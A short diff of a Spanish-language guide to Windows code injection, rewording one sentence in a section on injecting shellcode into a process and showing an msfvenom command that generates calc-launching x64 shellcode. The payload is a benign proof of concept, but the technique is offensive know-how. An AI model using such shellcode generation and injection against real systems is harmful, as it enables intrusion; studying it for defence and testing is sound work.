@@ -62,7 +62,7 @@ https://tyranidslair.blogspot.com/2019/08/windows-code-injection-bypassing-cig.h
 
 **4.- Inyectar shellcode en un proceso de Windows**
 
-La idea es la misma que antes, pero en este caso no necesitamos del archivo físico de la DLL. Simplemente encontramos un proceso donde inyectar nuestro shellcode. Vamos a inyectar la ejecución de la calculadora de Windows:
+La idea es la misma que antes, pero en este caso no necesitamos del archivo físico de la DLL. Simplemente encontramos un proceso donde inyectar nuestro shellcode. Vamos a inyectar en el proceso la calculadora de Windows:
 
    ```
    msfvenom -a x64 --platform Windows -p windows/x64/exec cmd=calc.exe -b '\x00\x0a\x0d' -f c -v shellcode
